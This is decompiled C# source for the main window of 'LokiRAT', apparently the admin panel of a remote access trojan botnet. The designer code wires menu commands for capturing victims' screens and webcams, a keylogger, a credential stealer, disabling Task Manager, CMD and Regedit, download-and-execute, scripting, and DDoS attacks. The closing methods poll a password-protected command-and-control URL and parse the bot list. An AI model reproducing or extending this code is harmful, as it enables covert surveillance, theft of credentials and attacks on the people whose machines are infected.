            this.crazyKeyboardToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.startToolStripMenuItem, this.stopToolStripMenuItem });
            this.crazyKeyboardToolStripMenuItem.Image = (Image) manager.GetObject("crazyKeyboardToolStripMenuItem.Image");
            this.crazyKeyboardToolStripMenuItem.Name = "crazyKeyboardToolStripMenuItem";
            this.crazyKeyboardToolStripMenuItem.Size = new Size(0x9c, 0x16);
            this.crazyKeyboardToolStripMenuItem.Text = "Crazy Keyboard";
            this.startToolStripMenuItem.Image = (Image) manager.GetObject("startToolStripMenuItem.Image");
            this.startToolStripMenuItem.Name = "startToolStripMenuItem";
            this.startToolStripMenuItem.Size = new Size(0x62, 0x16);
            this.startToolStripMenuItem.Text = "Start";
            this.startToolStripMenuItem.Click += new EventHandler(this.startToolStripMenuItem_Click);
            this.stopToolStripMenuItem.Image = (Image) manager.GetObject("stopToolStripMenuItem.Image");
            this.stopToolStripMenuItem.Name = "stopToolStripMenuItem";
            this.stopToolStripMenuItem.Size = new Size(0x62, 0x16);
            this.stopToolStripMenuItem.Text = "Stop";
            this.stopToolStripMenuItem.Click += new EventHandler(this.stopToolStripMenuItem_Click);
            this.toolStripSeparator5.Name = "toolStripSeparator5";
            this.toolStripSeparator5.Size = new Size(0xde, 6);
            this.screenshootToolStripMenuItem.Image = (Image) manager.GetObject("screenshootToolStripMenuItem.Image");
            this.screenshootToolStripMenuItem.Name = "screenshootToolStripMenuItem";
            this.screenshootToolStripMenuItem.Size = new Size(0xe1, 0x16);
            this.screenshootToolStripMenuItem.Text = "Screenshoot";
            this.screenshootToolStripMenuItem.Click += new EventHandler(this.screenshootToolStripMenuItem_Click);
            this.webcamToolStripMenuItem.Image = (Image) manager.GetObject("webcamToolStripMenuItem.Image");
            this.webcamToolStripMenuItem.Name = "webcamToolStripMenuItem";
            this.webcamToolStripMenuItem.Size = new Size(0xe1, 0x16);
            this.webcamToolStripMenuItem.Text = "Webcam";
            this.webcamToolStripMenuItem.Click += new EventHandler(this.webcamToolStripMenuItem_Click);
            this.registryToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.taskManagerToolStripMenuItem, this.cMDToolStripMenuItem, this.regeditToolStripMenuItem });
            this.registryToolStripMenuItem.Image = (Image) manager.GetObject("registryToolStripMenuItem.Image");
            this.registryToolStripMenuItem.Name = "registryToolStripMenuItem";
            this.registryToolStripMenuItem.Size = new Size(0xe1, 0x16);
            this.registryToolStripMenuItem.Text = "Registry";
            this.taskManagerToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.enableToolStripMenuItem1, this.disableToolStripMenuItem1 });
            this.taskManagerToolStripMenuItem.Image = (Image) manager.GetObject("taskManagerToolStripMenuItem.Image");
            this.taskManagerToolStripMenuItem.Name = "taskManagerToolStripMenuItem";
            this.taskManagerToolStripMenuItem.Size = new Size(0x94, 0x16);
            this.taskManagerToolStripMenuItem.Text = "Task Manager";
            this.enableToolStripMenuItem1.Image = (Image) manager.GetObject("enableToolStripMenuItem1.Image");
            this.enableToolStripMenuItem1.Name = "enableToolStripMenuItem1";
            this.enableToolStripMenuItem1.Size = new Size(0x70, 0x16);
            this.enableToolStripMenuItem1.Text = "Enable";
            this.enableToolStripMenuItem1.Click += new EventHandler(this.enableToolStripMenuItem1_Click);
            this.disableToolStripMenuItem1.Image = (Image) manager.GetObject("disableToolStripMenuItem1.Image");
            this.disableToolStripMenuItem1.Name = "disableToolStripMenuItem1";
            this.disableToolStripMenuItem1.Size = new Size(0x70, 0x16);
            this.disableToolStripMenuItem1.Text = "Disable";
            this.disableToolStripMenuItem1.Click += new EventHandler(this.disableToolStripMenuItem1_Click);
            this.cMDToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.enableToolStripMenuItem2, this.disableToolStripMenuItem2 });
            this.cMDToolStripMenuItem.Image = (Image) manager.GetObject("cMDToolStripMenuItem.Image");
            this.cMDToolStripMenuItem.Name = "cMDToolStripMenuItem";
            this.cMDToolStripMenuItem.Size = new Size(0x94, 0x16);
            this.cMDToolStripMenuItem.Text = "CMD";
            this.enableToolStripMenuItem2.Image = (Image) manager.GetObject("enableToolStripMenuItem2.Image");
            this.enableToolStripMenuItem2.Name = "enableToolStripMenuItem2";
            this.enableToolStripMenuItem2.Size = new Size(0x70, 0x16);
            this.enableToolStripMenuItem2.Text = "Enable";
            this.enableToolStripMenuItem2.Click += new EventHandler(this.enableToolStripMenuItem2_Click);
            this.disableToolStripMenuItem2.Image = (Image) manager.GetObject("disableToolStripMenuItem2.Image");
            this.disableToolStripMenuItem2.Name = "disableToolStripMenuItem2";
            this.disableToolStripMenuItem2.Size = new Size(0x70, 0x16);
            this.disableToolStripMenuItem2.Text = "Disable";
            this.disableToolStripMenuItem2.Click += new EventHandler(this.disableToolStripMenuItem2_Click);
            this.regeditToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.enableToolStripMenuItem3, this.disableToolStripMenuItem3 });
            this.regeditToolStripMenuItem.Image = (Image) manager.GetObject("regeditToolStripMenuItem.Image");
            this.regeditToolStripMenuItem.Name = "regeditToolStripMenuItem";
            this.regeditToolStripMenuItem.Size = new Size(0x94, 0x16);
            this.regeditToolStripMenuItem.Text = "Regedit";
            this.enableToolStripMenuItem3.Image = (Image) manager.GetObject("enableToolStripMenuItem3.Image");
            this.enableToolStripMenuItem3.Name = "enableToolStripMenuItem3";
            this.enableToolStripMenuItem3.Size = new Size(0x70, 0x16);
            this.enableToolStripMenuItem3.Text = "Enable";
            this.enableToolStripMenuItem3.Click += new EventHandler(this.enableToolStripMenuItem3_Click);
            this.disableToolStripMenuItem3.Image = (Image) manager.GetObject("disableToolStripMenuItem3.Image");
            this.disableToolStripMenuItem3.Name = "disableToolStripMenuItem3";
            this.disableToolStripMenuItem3.Size = new Size(0x70, 0x16);
            this.disableToolStripMenuItem3.Text = "Disable";
            this.disableToolStripMenuItem3.Click += new EventHandler(this.disableToolStripMenuItem3_Click);
            this.computerToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.shutdownToolStripMenuItem, this.restartToolStripMenuItem, this.logOffToolStripMenuItem, this.hibernationToolStripMenuItem });
            this.computerToolStripMenuItem.Image = (Image) manager.GetObject("computerToolStripMenuItem.Image");
            this.computerToolStripMenuItem.Name = "computerToolStripMenuItem";
            this.computerToolStripMenuItem.Size = new Size(0xe1, 0x16);
            this.computerToolStripMenuItem.Text = "Computer";
            this.shutdownToolStripMenuItem.Image = (Image) manager.GetObject("shutdownToolStripMenuItem.Image");
            this.shutdownToolStripMenuItem.Name = "shutdownToolStripMenuItem";
            this.shutdownToolStripMenuItem.Size = new Size(0x89, 0x16);
            this.shutdownToolStripMenuItem.Text = "Shutdown";
            this.shutdownToolStripMenuItem.Click += new EventHandler(this.shutdownToolStripMenuItem_Click);
            this.restartToolStripMenuItem.Image = (Image) manager.GetObject("restartToolStripMenuItem.Image");
            this.restartToolStripMenuItem.Name = "restartToolStripMenuItem";
            this.restartToolStripMenuItem.Size = new Size(0x89, 0x16);
            this.restartToolStripMenuItem.Text = "Restart";
            this.restartToolStripMenuItem.Click += new EventHandler(this.restartToolStripMenuItem_Click);
            this.logOffToolStripMenuItem.Image = (Image) manager.GetObject("logOffToolStripMenuItem.Image");
            this.logOffToolStripMenuItem.Name = "logOffToolStripMenuItem";
            this.logOffToolStripMenuItem.Size = new Size(0x89, 0x16);
            this.logOffToolStripMenuItem.Text = "Stand By";
            this.logOffToolStripMenuItem.Click += new EventHandler(this.logOffToolStripMenuItem_Click);
            this.hibernationToolStripMenuItem.Image = (Image) manager.GetObject("hibernationToolStripMenuItem.Image");
            this.hibernationToolStripMenuItem.Name = "hibernationToolStripMenuItem";
            this.hibernationToolStripMenuItem.Size = new Size(0x89, 0x16);
            this.hibernationToolStripMenuItem.Text = "Hibernation";
            this.hibernationToolStripMenuItem.Click += new EventHandler(this.hibernationToolStripMenuItem_Click);
            this.toolStripSeparator4.Name = "toolStripSeparator4";
            this.toolStripSeparator4.Size = new Size(0xde, 6);
            this.clipboardToolStripMenuItem.Image = (Image) manager.GetObject("clipboardToolStripMenuItem.Image");
            this.clipboardToolStripMenuItem.Name = "clipboardToolStripMenuItem";
            this.clipboardToolStripMenuItem.Size = new Size(0xe1, 0x16);
            this.clipboardToolStripMenuItem.Text = "Clipboard";
            this.clipboardToolStripMenuItem.Click += new EventHandler(this.clipboardToolStripMenuItem_Click);
            this.downloadAndExecuteToolStripMenuItem.Image = (Image) manager.GetObject("downloadAndExecuteToolStripMenuItem.Image");
            this.downloadAndExecuteToolStripMenuItem.Name = "downloadAndExecuteToolStripMenuItem";
            this.downloadAndExecuteToolStripMenuItem.Size = new Size(0xe1, 0x16);
            this.downloadAndExecuteToolStripMenuItem.Text = "Execute/Download/Open";
            this.downloadAndExecuteToolStripMenuItem.Click += new EventHandler(this.downloadAndExecuteToolStripMenuItem_Click);
            this.scriptToolStripMenuItem.Image = (Image) manager.GetObject("scriptToolStripMenuItem.Image");
            this.scriptToolStripMenuItem.Name = "scriptToolStripMenuItem";
            this.scriptToolStripMenuItem.Size = new Size(0xe1, 0x16);
            this.scriptToolStripMenuItem.Text = "Scripting (HTML/Batch/VBS)";
            this.scriptToolStripMenuItem.Click += new EventHandler(this.scriptToolStripMenuItem_Click);
            this.dDosToolStripMenuItem.Image = (Image) manager.GetObject("dDosToolStripMenuItem.Image");
            this.dDosToolStripMenuItem.Name = "dDosToolStripMenuItem";
            this.dDosToolStripMenuItem.Size = new Size(0xe1, 0x16);
            this.dDosToolStripMenuItem.Text = "DDos Attack";
            this.dDosToolStripMenuItem.Click += new EventHandler(this.dDosToolStripMenuItem_Click);
            this.visitPageToolStripMenuItem.Image = (Image) manager.GetObject("visitPageToolStripMenuItem.Image");
            this.visitPageToolStripMenuItem.Name = "visitPageToolStripMenuItem";
            this.visitPageToolStripMenuItem.Size = new Size(0xe1, 0x16);
            this.visitPageToolStripMenuItem.Text = "Visit Page";
            this.visitPageToolStripMenuItem.Click += new EventHandler(this.visitPageToolStripMenuItem_Click);
            this.toolStripSeparator3.Name = "toolStripSeparator3";
            this.toolStripSeparator3.Size = new Size(0xde, 6);
            this.downloadAndRunStealerToolStripMenuItem.Image = (Image) manager.GetObject("downloadAndRunStealerToolStripMenuItem.Image");
            this.downloadAndRunStealerToolStripMenuItem.Name = "downloadAndRunStealerToolStripMenuItem";
            this.downloadAndRunStealerToolStripMenuItem.Size = new Size(0xe1, 0x16);
            this.downloadAndRunStealerToolStripMenuItem.Text = "Run Stealer";
            this.downloadAndRunStealerToolStripMenuItem.Click += new EventHandler(this.downloadAndRunStealerToolStripMenuItem_Click);
            this.downloadAndRunKeyloggerToolStripMenuItem.Image = (Image) manager.GetObject("downloadAndRunKeyloggerToolStripMenuItem.Image");
            this.downloadAndRunKeyloggerToolStripMenuItem.Name = "downloadAndRunKeyloggerToolStripMenuItem";
            this.downloadAndRunKeyloggerToolStripMenuItem.Size = new Size(0xe1, 0x16);
            this.downloadAndRunKeyloggerToolStripMenuItem.Text = "Keylogger";
            this.downloadAndRunKeyloggerToolStripMenuItem.Click += new EventHandler(this.downloadAndRunKeyloggerToolStripMenuItem_Click);
            this.toolStripSeparator1.Name = "toolStripSeparator1";
            this.toolStripSeparator1.Size = new Size(0xde, 6);
            this.botToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.doNotRunNextComputerStartToolStripMenuItem, this.uninstallToolStripMenuItem, this.closeToolStripMenuItem, this.toolStripSeparator7, this.deleteFromListToolStripMenuItem, this.deleteFromDatabaseToolStripMenuItem });
            this.botToolStripMenuItem.Image = (Image) manager.GetObject("botToolStripMenuItem.Image");
            this.botToolStripMenuItem.Name = "botToolStripMenuItem";
            this.botToolStripMenuItem.Size = new Size(0xe1, 0x16);
            this.botToolStripMenuItem.Text = "Bot";
            this.doNotRunNextComputerStartToolStripMenuItem.Image = (Image) manager.GetObject("doNotRunNextComputerStartToolStripMenuItem.Image");
            this.doNotRunNextComputerStartToolStripMenuItem.Name = "doNotRunNextComputerStartToolStripMenuItem";
            this.doNotRunNextComputerStartToolStripMenuItem.Size = new Size(0xbf, 0x16);
            this.doNotRunNextComputerStartToolStripMenuItem.Text = "Remove from Registry";
            this.doNotRunNextComputerStartToolStripMenuItem.Click += new EventHandler(this.doNotRunNextComputerStartToolStripMenuItem_Click);
            this.uninstallToolStripMenuItem.Image = (Image) manager.GetObject("uninstallToolStripMenuItem.Image");
            this.uninstallToolStripMenuItem.Name = "uninstallToolStripMenuItem";
            this.uninstallToolStripMenuItem.Size = new Size(0xbf, 0x16);
            this.uninstallToolStripMenuItem.Text = "Uninstall";
            this.uninstallToolStripMenuItem.Click += new EventHandler(this.uninstallToolStripMenuItem_Click);
            this.closeToolStripMenuItem.Image = (Image) manager.GetObject("closeToolStripMenuItem.Image");
            this.closeToolStripMenuItem.Name = "closeToolStripMenuItem";
            this.closeToolStripMenuItem.Size = new Size(0xbf, 0x16);
            this.closeToolStripMenuItem.Text = "Close";
            this.closeToolStripMenuItem.Click += new EventHandler(this.closeToolStripMenuItem_Click);
            this.toolStripSeparator7.Name = "toolStripSeparator7";
            this.toolStripSeparator7.Size = new Size(0xbc, 6);
            this.deleteFromListToolStripMenuItem.Image = (Image) manager.GetObject("deleteFromListToolStripMenuItem.Image");
            this.deleteFromListToolStripMenuItem.Name = "deleteFromListToolStripMenuItem";
            this.deleteFromListToolStripMenuItem.Size = new Size(0xbf, 0x16);
            this.deleteFromListToolStripMenuItem.Text = "Delete From List";
            this.deleteFromListToolStripMenuItem.Click += new EventHandler(this.deleteFromListToolStripMenuItem_Click);
            this.deleteFromDatabaseToolStripMenuItem.Image = (Image) manager.GetObject("deleteFromDatabaseToolStripMenuItem.Image");
            this.deleteFromDatabaseToolStripMenuItem.Name = "deleteFromDatabaseToolStripMenuItem";
            this.deleteFromDatabaseToolStripMenuItem.Size = new Size(0xbf, 0x16);
            this.deleteFromDatabaseToolStripMenuItem.Text = "Delete From Database";
            this.deleteFromDatabaseToolStripMenuItem.Click += new EventHandler(this.deleteFromDatabaseToolStripMenuItem_Click);
            this.imageList1.ImageStream = (ImageListStreamer) manager.GetObject("imageList1.ImageStream");
            this.imageList1.TransparentColor = System.Drawing.Color.Transparent;
            this.imageList1.Images.SetKeyName(0, "deactive.png");
            this.imageList1.Images.SetKeyName(1, "active.png");
            this.menuStrip1.BackColor = System.Drawing.Color.WhiteSmoke;
            this.menuStrip1.GripStyle = ToolStripGripStyle.Visible;
            this.menuStrip1.Items.AddRange(new ToolStripItem[] { this.adminToolStripMenuItem, this.connectionToolStripMenuItem, this.refreshToolStripMenuItem, this.builderToolStripMenuItem, this.informationToolStripMenuItem });
            this.menuStrip1.LayoutStyle = ToolStripLayoutStyle.HorizontalStackWithOverflow;
            this.menuStrip1.Location = new Point(0, 0);
            this.menuStrip1.Name = "menuStrip1";
            this.menuStrip1.Size = new Size(0x3c5, 0x18);
            this.menuStrip1.TabIndex = 2;
            this.menuStrip1.Text = "menuStrip1";
            this.adminToolStripMenuItem.Image = (Image) manager.GetObject("adminToolStripMenuItem.Image");
            this.adminToolStripMenuItem.Name = "adminToolStripMenuItem";
            this.adminToolStripMenuItem.Size = new Size(0x6d, 20);
            this.adminToolStripMenuItem.Text = "Configuration";
            this.adminToolStripMenuItem.Click += new EventHandler(this.adminToolStripMenuItem_Click);
            this.connectionToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.connectiToolStripMenuItem, this.disconnectToolStripMenuItem });
            this.connectionToolStripMenuItem.Image = (Image) manager.GetObject("connectionToolStripMenuItem.Image");
            this.connectionToolStripMenuItem.Name = "connectionToolStripMenuItem";
            this.connectionToolStripMenuItem.Size = new Size(0x61, 20);
            this.connectionToolStripMenuItem.Text = "Connection";
            this.connectiToolStripMenuItem.Image = (Image) manager.GetObject("connectiToolStripMenuItem.Image");
            this.connectiToolStripMenuItem.Name = "connectiToolStripMenuItem";
            this.connectiToolStripMenuItem.Size = new Size(0x85, 0x16);
            this.connectiToolStripMenuItem.Text = "Connect";
            this.connectiToolStripMenuItem.Click += new EventHandler(this.connectiToolStripMenuItem_Click);
            this.disconnectToolStripMenuItem.Image = (Image) manager.GetObject("disconnectToolStripMenuItem.Image");
            this.disconnectToolStripMenuItem.Name = "disconnectToolStripMenuItem";
            this.disconnectToolStripMenuItem.Size = new Size(0x85, 0x16);
            this.disconnectToolStripMenuItem.Text = "Disconnect";
            this.disconnectToolStripMenuItem.Click += new EventHandler(this.disconnectToolStripMenuItem_Click);
            this.refreshToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.reloadToolStripMenuItem1, this.clearAllToolStripMenuItem1, this.clearFromDatabaseToolStripMenuItem });
            this.refreshToolStripMenuItem.Image = (Image) manager.GetObject("refreshToolStripMenuItem.Image");
            this.refreshToolStripMenuItem.Name = "refreshToolStripMenuItem";
            this.refreshToolStripMenuItem.Size = new Size(0x3a, 20);
            this.refreshToolStripMenuItem.Text = "Bots";
            this.reloadToolStripMenuItem1.Image = (Image) manager.GetObject("reloadToolStripMenuItem1.Image");
            this.reloadToolStripMenuItem1.Name = "reloadToolStripMenuItem1";
            this.reloadToolStripMenuItem1.Size = new Size(0xb7, 0x16);
            this.reloadToolStripMenuItem1.Text = "Reload";
            this.reloadToolStripMenuItem1.Click += new EventHandler(this.reloadToolStripMenuItem1_Click);
            this.clearAllToolStripMenuItem1.Image = (Image) manager.GetObject("clearAllToolStripMenuItem1.Image");
            this.clearAllToolStripMenuItem1.Name = "clearAllToolStripMenuItem1";
            this.clearAllToolStripMenuItem1.Size = new Size(0xb7, 0x16);
            this.clearAllToolStripMenuItem1.Text = "Clear All";
            this.clearAllToolStripMenuItem1.Click += new EventHandler(this.clearAllToolStripMenuItem1_Click);
            this.clearFromDatabaseToolStripMenuItem.Image = (Image) manager.GetObject("clearFromDatabaseToolStripMenuItem.Image");
            this.clearFromDatabaseToolStripMenuItem.Name = "clearFromDatabaseToolStripMenuItem";
            this.clearFromDatabaseToolStripMenuItem.Size = new Size(0xb7, 0x16);
            this.clearFromDatabaseToolStripMenuItem.Text = "Clear From Database";
            this.clearFromDatabaseToolStripMenuItem.Click += new EventHandler(this.clearFromDatabaseToolStripMenuItem_Click);
            this.builderToolStripMenuItem.Image = (Image) manager.GetObject("builderToolStripMenuItem.Image");
            this.builderToolStripMenuItem.Name = "builderToolStripMenuItem";
            this.builderToolStripMenuItem.Size = new Size(0x48, 20);
            this.builderToolStripMenuItem.Text = "Builder";
            this.builderToolStripMenuItem.Click += new EventHandler(this.builderToolStripMenuItem_Click);
            this.informationToolStripMenuItem.Image = (Image) manager.GetObject("informationToolStripMenuItem.Image");
            this.informationToolStripMenuItem.Name = "informationToolStripMenuItem";
            this.informationToolStripMenuItem.Size = new Size(0x44, 20);
            this.informationToolStripMenuItem.Text = "About";
            this.informationToolStripMenuItem.Click += new EventHandler(this.informationToolStripMenuItem_Click);
            this.listBox1.BackColor = SystemColors.ControlLight;
            this.listBox1.BorderStyle = BorderStyle.None;
            this.listBox1.FormattingEnabled = true;
            this.listBox1.Location = new Point(0, 3);
            this.listBox1.Name = "listBox1";
            this.listBox1.Size = new Size(0x1ab, 0x68);
            this.listBox1.TabIndex = 10;
            this.listBox1.BindingContextChanged += new EventHandler(this.listBox1_BindingContextChanged);
            this.label13.AutoSize = true;
            this.label13.Location = new Point(0x20a, 0x36);
            this.label13.Name = "label13";
            this.label13.Size = new Size(13, 13);
            this.label13.TabIndex = 7;
            this.label13.Text = "_";
            this.label12.AutoSize = true;
            this.label12.Location = new Point(0x20a, 30);
            this.label12.Name = "label12";
            this.label12.Size = new Size(13, 13);
            this.label12.TabIndex = 6;
            this.label12.Text = "_";
            this.label10.AutoSize = true;
            this.label10.Location = new Point(0x1ee, 7);
            this.label10.Name = "label10";
            this.label10.Size = new Size(13, 13);
            this.label10.TabIndex = 4;
            this.label10.Text = "_";
            this.label4.AutoSize = true;
            this.label4.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.label4.ForeColor = SystemColors.HotTrack;
            this.label4.Location = new Point(0x1b1, 0x36);
            this.label4.Name = "label4";
            this.label4.Size = new Size(0x53, 13);
            this.label4.TabIndex = 3;
            this.label4.Text = "Update Interval:";
            this.label3.AutoSize = true;
            this.label3.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.label3.ForeColor = SystemColors.HotTrack;
            this.label3.Location = new Point(0x1b1, 30);
            this.label3.Name = "label3";
            this.label3.Size = new Size(0x57, 13);
            this.label3.TabIndex = 2;
            this.label3.Text = "Last Connection:";
            this.label1.AutoSize = true;
            this.label1.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.label1.ForeColor = SystemColors.HotTrack;
            this.label1.Location = new Point(0x1b1, 7);
            this.label1.Name = "label1";
            this.label1.Size = new Size(0x37, 13);
            this.label1.TabIndex = 0;
            this.label1.Text = "PC Name:";
            this.pictureBox1.Image = (Image) manager.GetObject("pictureBox1.Image");
            this.pictureBox1.Location = new Point(0x120, 6);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new Size(0x12e, 0x63);
            this.pictureBox1.TabIndex = 0;
            this.pictureBox1.TabStop = false;
            this.label18.AutoSize = true;
            this.label18.Location = new Point(0x1e5, 8);
            this.label18.Name = "label18";
            this.label18.Size = new Size(0x49, 13);
            this.label18.TabIndex = 9;
            this.label18.Text = "Disconnected";
            this.label17.AutoSize = true;
            this.label17.Location = new Point(0x5b, 0x54);
            this.label17.Name = "label17";
            this.label17.Size = new Size(13, 13);
            this.label17.TabIndex = 8;
            this.label17.Text = "_";
            this.label16.AutoSize = true;
            this.label16.Location = new Point(0x5b, 60);
            this.label16.Name = "label16";
            this.label16.Size = new Size(13, 13);
            this.label16.TabIndex = 7;
            this.label16.Text = "0";
            this.label15.AutoSize = true;
            this.label15.Location = new Point(0x5b, 0x22);
            this.label15.Name = "label15";
            this.label15.Size = new Size(13, 13);
            this.label15.TabIndex = 6;
            this.label15.Text = "_";
            this.label14.AutoSize = true;
            this.label14.Location = new Point(0x43, 12);
            this.label14.Name = "label14";
            this.label14.Size = new Size(13, 13);
            this.label14.TabIndex = 5;
            this.label14.Text = "_";
            this.label9.AutoSize = true;
            this.label9.ForeColor = SystemColors.HotTrack;
            this.label9.Location = new Point(9, 60);
            this.label9.Name = "label9";
            this.label9.Size = new Size(0x4c, 13);
            this.label9.TabIndex = 4;
            this.label9.Text = "Client Number:";
            this.label5.AutoSize = true;
            this.label5.ForeColor = SystemColors.HotTrack;
            this.label5.Location = new Point(0x1b7, 8);
            this.label5.Name = "label5";
            this.label5.Size = new Size(40, 13);
            this.label5.TabIndex = 3;
            this.label5.Text = "Status:";
            this.label6.AutoSize = true;
            this.label6.ForeColor = SystemColors.HotTrack;
            this.label6.Location = new Point(8, 0x54);
            this.label6.Name = "label6";
            this.label6.Size = new Size(0x51, 13);
            this.label6.TabIndex = 2;
            this.label6.Text = "Last Load Bots:";
            this.label7.AutoSize = true;
            this.label7.ForeColor = SystemColors.HotTrack;
            this.label7.Location = new Point(8, 0x22);
            this.label7.Name = "label7";
            this.label7.Size = new Size(0x4d, 13);
            this.label7.TabIndex = 1;
            this.label7.Text = "Site Password:";
            this.label8.AutoSize = true;
            this.label8.ForeColor = SystemColors.HotTrack;
            this.label8.Location = new Point(8, 8);
            this.label8.Name = "label8";
            this.label8.Size = new Size(0x35, 13);
            this.label8.TabIndex = 0;
            this.label8.Text = "Site URL:";
            this.tabControl1.Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom;
            this.tabControl1.Controls.Add(this.tabPage1);
            this.tabControl1.Controls.Add(this.tabPage2);
            this.tabControl1.Controls.Add(this.tabPage3);
            this.tabControl1.Location = new Point(0, 0x163);
            this.tabControl1.Name = "tabControl1";
            this.tabControl1.SelectedIndex = 0;
            this.tabControl1.Size = new Size(0x3c5, 0x89);
            this.tabControl1.TabIndex = 7;
            this.tabPage1.Controls.Add(this.listBox1);
            this.tabPage1.Controls.Add(this.label1);
            this.tabPage1.Controls.Add(this.label13);
            this.tabPage1.Controls.Add(this.label10);
            this.tabPage1.Controls.Add(this.label4);
            this.tabPage1.Controls.Add(this.label12);
            this.tabPage1.Controls.Add(this.label3);
            this.tabPage1.Location = new Point(4, 0x16);
            this.tabPage1.Name = "tabPage1";
            this.tabPage1.Padding = new Padding(3);
            this.tabPage1.Size = new Size(0x3bd, 0x6f);
            this.tabPage1.TabIndex = 0;
            this.tabPage1.Text = "Bot Status";
            this.tabPage1.UseVisualStyleBackColor = true;
            this.tabPage2.Controls.Add(this.label11);
            this.tabPage2.Controls.Add(this.label2);
            this.tabPage2.Controls.Add(this.label18);
            this.tabPage2.Controls.Add(this.label5);
            this.tabPage2.Controls.Add(this.label8);
            this.tabPage2.Controls.Add(this.label17);
            this.tabPage2.Controls.Add(this.label7);
            this.tabPage2.Controls.Add(this.label16);
            this.tabPage2.Controls.Add(this.label6);
            this.tabPage2.Controls.Add(this.label15);
            this.tabPage2.Controls.Add(this.label9);
            this.tabPage2.Controls.Add(this.label14);
            this.tabPage2.Location = new Point(4, 0x16);
            this.tabPage2.Name = "tabPage2";
            this.tabPage2.Padding = new Padding(3);
            this.tabPage2.Size = new Size(0x3bd, 0x6f);
            this.tabPage2.TabIndex = 1;
            this.tabPage2.Text = "Server Status";
            this.tabPage2.UseVisualStyleBackColor = true;
            this.label11.AutoSize = true;
            this.label11.Location = new Point(0x1e5, 0x22);
            this.label11.Name = "label11";
            this.label11.Size = new Size(13, 13);
            this.label11.TabIndex = 11;
            this.label11.Text = "_";
            this.label2.AutoSize = true;
            this.label2.ForeColor = SystemColors.HotTrack;
            this.label2.Location = new Point(0x19b, 0x22);
            this.label2.Name = "label2";
            this.label2.Size = new Size(0x44, 13);
            this.label2.TabIndex = 10;
            this.label2.Text = "Stealer URL:";
            this.tabPage3.Controls.Add(this.pictureBox1);
            this.tabPage3.Location = new Point(4, 0x16);
            this.tabPage3.Name = "tabPage3";
            this.tabPage3.Padding = new Padding(3);
            this.tabPage3.Size = new Size(0x3bd, 0x6f);
            this.tabPage3.TabIndex = 2;
            this.tabPage3.Text = "Program Info";
            this.tabPage3.UseVisualStyleBackColor = true;
            this.timer2.Interval = 0x3e8;
            this.timer2.Tick += new EventHandler(this.timer2_Tick);
            this.label19.Anchor = AnchorStyles.Right | AnchorStyles.Top;
            this.label19.AutoSize = true;
            this.label19.BackColor = SystemColors.Control;
            this.label19.Location = new Point(0x378, 6);
            this.label19.Name = "label19";
            this.label19.Size = new Size(13, 13);
            this.label19.TabIndex = 8;
            this.label19.Text = "_";
            this.timer1.Enabled = true;
            this.timer1.Interval = 0x3e8;
            this.timer1.Tick += new EventHandler(this.timer1_Tick);
            this.label20.Anchor = AnchorStyles.Right | AnchorStyles.Top;
            this.label20.AutoSize = true;
            this.label20.Location = new Point(0x32f, 6);
            this.label20.Name = "label20";
            this.label20.Size = new Size(0x4b, 13);
            this.label20.TabIndex = 9;
            this.label20.Text = "Program Time:";
            base.AutoScaleDimensions = new SizeF(6f, 13f);
            base.AutoScaleMode = AutoScaleMode.Font;
            base.ClientSize = new Size(0x3c5, 0x1e6);
            base.Controls.Add(this.label20);
            base.Controls.Add(this.label19);
            base.Controls.Add(this.tabControl1);
            base.Controls.Add(this.menuStrip1);
            base.Controls.Add(this.listView1);
            base.Icon = (Icon) manager.GetObject("$this.Icon");
            base.MainMenuStrip = this.menuStrip1;
            base.Name = "main";
            this.Text = "Admin Panel | LokiRAT";
            base.Load += new EventHandler(this.main_Load);
            this.contextMenuStrip1.ResumeLayout(false);
            this.menuStrip1.ResumeLayout(false);
            this.menuStrip1.PerformLayout();
            ((ISupportInitialize) this.pictureBox1).EndInit();
            this.tabControl1.ResumeLayout(false);
            this.tabPage1.ResumeLayout(false);
            this.tabPage1.PerformLayout();
            this.tabPage2.ResumeLayout(false);
            this.tabPage2.PerformLayout();
            this.tabPage3.ResumeLayout(false);
            base.ResumeLayout(false);
            base.PerformLayout();
        }

        private void InitializeForm()
        {
            this.osSkin.BeginUpdate();
            this.osSkin.Style = SkinStyle.Office2007Silver;
            this.osSkin.EndUpdate();
            this.wbt.DownloadStringCompleted += new DownloadStringCompletedEventHandler(this.wbt_Downloaded);
        }

        private void listBox1_BindingContextChanged(object sender, EventArgs e)
        {
            this.listBox1.SelectedIndex = this.listBox1.Items.Count - 1;
        }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                selectedBot = this.listView1.SelectedIndices[0];
                currentID = this.botsA[selectedBot, 0];
                this.label10.Text = this.botsA[selectedBot, 1];
                this.label12.Text = this.botsA[selectedBot, 6];
                this.label13.Text = this.botsA[selectedBot, 5] + " ms";
            }
            catch
            {
                currentID = "{-error-}";
            }
            try
            {
                Uri address = new Uri(connectionURL + "?pass=" + connectionPass + "&type=response&id=" + currentID);
                if (currentID != "{-error-}")
                {
                    this.wbt.DownloadStringAsync(address);
                }
            }
            catch
            {
            }
        }

        public void loadBots()
        {
            int num2;
            string input = loadPage("type=view");
            string[] strArray = new string[0x270f];
            string[] strArray2 = new string[15];
            this.listView1.Items.Clear();
            try
            {
                strArray = Regex.Split(input, "{-next}");
                this.numBots = strArray.Length - 1;
                this.label16.Text = this.numBots.ToString();
                num2 = 0;
                while (num2 < this.numBots)
                {
                    int num;
                    strArray2 = Regex.Split(strArray[num2], "{-}");
                    for (int i = 0; i < strArray2.Length; i++)
                    {
                        this.botsA[num2, i] = strArray2[i];
                    }
